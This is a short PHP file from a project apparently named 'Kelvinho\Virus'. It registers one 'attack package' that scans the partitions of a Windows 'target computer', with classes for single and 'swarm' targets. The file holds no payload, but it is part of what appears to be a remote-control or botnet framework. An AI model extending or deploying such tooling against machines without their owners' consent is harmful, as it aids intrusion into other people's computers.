<?php

use Kelvinho\Virus\Attack\Classes;
use Kelvinho\Virus\Attack\PackageRegistrar;

PackageRegistrar::register("win.oneTime.ScanPartitions", "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\ScanPartitions", "easy.ScanPartitions", __DIR__, [Classes::WINDOWS_ALONE, Classes::WINDOWS_SWARM], "Scans for every available partitions on the target computer.");